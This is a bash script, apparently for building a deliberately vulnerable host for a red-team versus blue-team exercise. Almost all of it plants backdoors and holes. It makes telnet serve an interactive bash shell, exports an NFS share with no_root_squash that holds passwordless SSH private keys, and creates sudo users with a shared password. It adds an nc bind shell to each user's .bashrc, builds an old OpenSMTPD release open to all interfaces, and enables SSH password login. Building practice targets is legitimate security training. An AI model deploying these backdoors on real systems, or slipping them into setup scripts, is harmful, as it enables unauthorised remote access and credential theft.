#!/bin/bash

# telnet  to root shell
sudo apt update
sudo apt-get install telnetd -y
touch /usr/local/bin/telnet
echo "#!/bin/bash" > /usr/local/bin/telnet
echo "exec /bin/bash -i" >> /usr/local/bin/telnet
chmod +x /usr/local/bin/telnet
sudo systemctl restart inetutils-inetd
sudo iptables -A INPUT -p tcp --dport 23 -j ACCEPT
echo "telnet stream tcp nowait root /usr/sbin/telnetd telnetd -E  /usr/local/bin/telnet" >> /etc/inetd.conf

#nfs with ssh keys and creds
sudo apt install nfs-kernel-server -y
mkdir -p /srv/nfs
echo "/srv/nfs *(rw,sync,no_root_squash,no_subtree_check)" | sudo tee -a /etc/exports
sudo systemctl restart nfs-kernel-server

USERS=("aiden" "redhead" "megamind" "izzabizzradio" "maggiegz" "owendraingang" "dhrupad")
PASSWORD="Blueteamsux123!"

for USER in "${USERS[@]}"; do
  sudo useradd -m "$USER"
  sudo usermod -aG sudo "$USER"
  echo "$USER:$PASSWORD" | sudo chpasswd
done

for USER in "${USERS[@]}"; do
  sudo mkdir -p /home/$USER/.ssh
done

sudo mkdir -p /srv/nfs/.ssh

for USER in "${USERS[@]}"; do
  sudo ssh-keygen -t rsa -f /srv/nfs/.ssh/${USER}_id_rsa -N ""
  sudo cp /srv/nfs/.ssh/${USER}_id_rsa.pub /home/$USER/.ssh/authorized_keys
  sudo chown $USER:$USER /home/$USER/.ssh/authorized_keys
  sudo chmod 600 /home/$USER/.ssh/authorized_keys
  
  # bind shell in .bashrc
  echo -e "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f & disown" | sudo tee -a /home/$USER/.bashrc
done

sudo iptables -A INPUT -p tcp --dport 4444 -j ACCEPT

# root password in share
touch /srv/nfs/reminder
echo "in case you forget root password is blank" > /srv/nfs/reminder

# ftp maybe
#sudo apt install vsftpd -y
#sudo cp /etc/vsftpd.conf /etc/vsftpd.conf.bak
#sudo tee /etc/vsftpd.conf > /dev/null << EOT
#listen=YES
#anonymous_enable=YES
#anon_upload_enable=YES
#anon_mkdir_write_enable=YES
#anon_other_write_enable=YES
#anon_root=/var/ftp
#local_enable=YES
#write_enable=YES
#local_umask=022
#dirmessage_enable=YES
#use_localtime=YES
#xferlog_enable=YES
#connect_from_port_20=YES
#secure_chroot_dir=/var/run/vsftpd/empty
#pam_service_name=vsftpd
#EOT

# Create FTP directories
#sudo mkdir -p /var/ftp/pub
#sudo chmod 777 -R /var/ftp/pub
#sudo systemctl restart vsftpd
#sudo systemctl enable vsftpd



sudo apt update
sudo apt install -y build-essential libtool automake libevent-dev zlib1g-dev bison libssl-dev libdb-dev git wget


wget https://github.com/OpenSMTPD/OpenSMTPD/releases/download/6.6.1p1/opensmtpd-6.6.1p1.tar.gz
tar -xzf opensmtpd-6.6.1p1.tar.gz
cd opensmtpd-6.6.1p1

# Install libasr if needed
if [ ! -f /usr/lib/libasr.so ]; then
  cd ..
  git clone https://github.com/OpenSMTPD/libasr.git
  cd libasr
  ./bootstrap
  ./configure
  make
  sudo make install
  sudo ldconfig
  cd ../opensmtpd-6.6.1p1
fi

# Configure with flags to fix the multiple definition errors
./bootstrap
./configure --with-cflags="-fcommon"
make
sudo make install

useradd -c "SMTP Daemon" -d /var/empty -s /sbin/nologin _smtpd
useradd -c "SMTPD Queue" -d /var/empty -s /sbin/nologin _smtpq
mkdir -p /var/empty
sudo iptables -A INPUT -p tcp --dport 25 -j ACCEPT
sudo mkdir -p /etc/mail
sudo touch /etc/mail/aliases
sudo rm /usr/local/etc/smtpd.conf

for USER in "${USERS[@]}"; do
  echo "$USER:ccso.org: $USER" | sudo tee -a /etc/mail/aliases > /dev/null
done

sudo tee /usr/local/etc/smtpd.conf <<EOF
#       \$OpenBSD: smtpd.conf,v 1.10 2018/05/24 11:40:17 gilles Exp $

# This is the smtpd server system-wide configuration file.
# See smtpd.conf(5) for more information.

table aliases file:/etc/mail/aliases

# To accept external mail, replace with: listen on all
listen on 0.0.0.0

action "local" mbox alias <aliases>
action "relay" relay

# Uncomment the following to accept external mail for domain "example.org"
match from any for domain "ccso.org" action "local"
match for local action "local"
match from local for any action "relay"
EOF

sudo tee /etc/systemd/system/opensmtpd.service <<EOF
[Unit]
Description=OpenSMTPD Mail Server
After=network.target

[Service]
ExecStart=/usr/local/sbin/smtpd
ExecReload=/bin/kill -HUP \$MAINPID
Type=forking
PIDFile=/var/run/opensmtpd.pid
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF

sudo tee /etc/ssh/sshd_config <<EOF
# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# This sshd was compiled with PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games

# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.

Include /etc/ssh/sshd_config.d/*.conf

#Port 22
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::

#HostKey /etc/ssh/ssh_host_rsa_key
#HostKey /etc/ssh/ssh_host_ecdsa_key
#HostKey /etc/ssh/ssh_host_ed25519_key

# Ciphers and keying
#RekeyLimit default none

# Logging
#SyslogFacility AUTH
#LogLevel INFO

# Authentication:

#LoginGraceTime 2m
#PermitRootLogin prohibit-password
#StrictModes yes
#MaxAuthTries 6
#MaxSessions 10

PubkeyAuthentication yes

# Expect .ssh/authorized_keys2 to be disregarded by default in future.
#AuthorizedKeysFile     .ssh/authorized_keys .ssh/authorized_keys2

#AuthorizedPrincipalsFile none

#AuthorizedKeysCommand none
#AuthorizedKeysCommandUser nobody

# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts
#HostbasedAuthentication no
# Change to yes if you don't trust ~/.ssh/known_hosts for
# HostbasedAuthentication
#IgnoreUserKnownHosts no
# Don't read the user's ~/.rhosts and ~/.shosts files
#IgnoreRhosts yes

# To disable tunneled clear text passwords, change to no here!
PasswordAuthentication yes
#PermitEmptyPasswords no

# Change to yes to enable challenge-response passwords (beware issues with
# some PAM modules and threads)
KbdInteractiveAuthentication no

# Kerberos options
#KerberosAuthentication no
#KerberosOrLocalPasswd yes
#KerberosTicketCleanup yes
#KerberosGetAFSToken no

# GSSAPI options
#GSSAPIAuthentication no
#GSSAPICleanupCredentials yes
#GSSAPIStrictAcceptorCheck yes
#GSSAPIKeyExchange no

# Set this to 'yes' to enable PAM authentication, account processing,
# and session processing. If this is enabled, PAM authentication will
# be allowed through the KbdInteractiveAuthentication and
# PasswordAuthentication.  Depending on your PAM configuration,
# PAM authentication via KbdInteractiveAuthentication may bypass
# the setting of "PermitRootLogin prohibit-password".
# If you just want the PAM account and session checks to run without
# PAM authentication, then enable this but set PasswordAuthentication
# and KbdInteractiveAuthentication to 'no'.
UsePAM yes

#AllowAgentForwarding yes
#AllowTcpForwarding yes
#GatewayPorts no
X11Forwarding yes
#X11DisplayOffset 10
#X11UseLocalhost yes
#PermitTTY yes
PrintMotd no
#PrintLastLog yes
#TCPKeepAlive yes
#PermitUserEnvironment no
#Compression delayed
#ClientAliveInterval 0
#ClientAliveCountMax 3
#UseDNS no
#PidFile /run/sshd.pid
#MaxStartups 10:30:100
#PermitTunnel no
#ChrootDirectory none
#VersionAddendum none

# no default banner path
#Banner none

# Allow client to pass locale environment variables
AcceptEnv LANG LC_*

# override default of no subsystems
Subsystem       sftp    /usr/lib/openssh/sftp-server

# Example of overriding settings on a per-user basis
#Match User anoncvs
#       X11Forwarding no
#       AllowTcpForwarding no
#       PermitTTY no
#       ForceCommand cvs server
EOF

sudo tee /etc/ssh/sshd_config.d/60-cloudimg-settings.conf <<EOF
PasswordAuthentication yes
EOF


sudo systemctl enable inetutils-inetd
sudo systemctl start inetutils-inetd
sudo systemctl enable nfs-kernel-server
sudo systemctl start nfs-kernel-server
sudo systemctl daemon-reload
sudo systemctl enable opensmtpd
sudo systemctl start opensmtpd
